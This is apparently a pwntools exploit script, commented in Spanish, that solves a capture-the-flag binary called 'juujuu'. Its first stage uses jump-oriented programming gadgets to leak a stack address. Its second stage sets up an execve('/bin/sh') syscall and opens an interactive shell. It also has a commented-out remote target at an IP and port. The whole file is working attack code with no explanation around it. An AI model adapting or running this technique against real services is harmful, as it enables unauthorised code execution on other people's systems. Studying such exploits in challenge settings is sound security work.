from pwn import *

#0x4000c5 syscall
#offset 2 24
r = process('./juujuu')
#gdb.attach(r)
#r = remote('159.89.45.52', 5555)
empezando = "/bin/sh\0" #controlamos este registro, rsi

#stage 1
#------------------------------------------------------------#
#construyendo salto atras
jop = "A" * 24
#saltando a rsp +8 , [rsp-8]
jop += p64(0x4000d4)
jop += p64(0x4000c7)
#write syscall para hacer un leak del stack
jop += p64(0x4000fc)
jop += p64(0x004000b0)

junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop))                        
payload = empezando                                                               
payload += jop                                                                      
payload += junk

#seteando [rcx] a dispatcher                                                    
payload += p64(0x4000d4)                                                   
payload += p64(0x4000c7)

#[rbp] a dispatcher
payload += p64(0x00000000004000cf)

#setear r10 a dispatcher, por que si no mas
payload += p64(0x4000ec)

#mas stack (pivot)                                                      
payload += p64(0x0000000000400131)#sub rsp 100                                  
r.sendline(payload)

#--------------------------------------------------------#

#stage2
#recibiendo leak del stack
resp = u64(r.recv(8))
print "LEAK  STACK  :   ",hex(resp)

#seteando salto atras para syscall final execve()
jop2 = "A" * 32
#
jop2 += p64(0x4000de) #inc RAX
jop2 += p64(resp)#restaurando rcx
jop2 += p64(0x4000de) #inc RAX
jop2 += p64(resp)#restaurando rcx
jop2 += p64(0x4000de) #inc RAX
jop2 += p64(resp)#restaurando rcx
jop2 += p64(0x400108)#add rax 12
jop2 += p64(0x400108)#add rax 12
jop2 += p64(0x400108)#add rax 12
jop2 += p64(0x400125)
jop2 += p64(resp-0x1c8) #address the bin sh enviada esta 0x1c8 del leak de stack
jop2 += p64(0x40011b)# xor los otros reg
jop2 += p64(resp)
jop2 += p64(0x400101) #syscall

junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop2))                                             
payload2 = empezando  #/bin/sh                                                               
payload2 += jop2                                                                     
payload2 += junk
#seteando [rcx] a dispatcher                                                   
payload2 += p64(0x4000d5) #rax a 0x0 y luego a 0x1                                                  
payload2 += p64(resp)#restaurando rcx
payload2 += p64(0x4000de) #inc RAX
payload2 += p64(resp)#restaurando rcx
#ganando stack
payload2 += p64(0x0000000000400131)#sub rsp 100                                            


r.sendline(payload2)

r.interactive()

#0x7ffd7521b2e8-0x7ffd7521b120
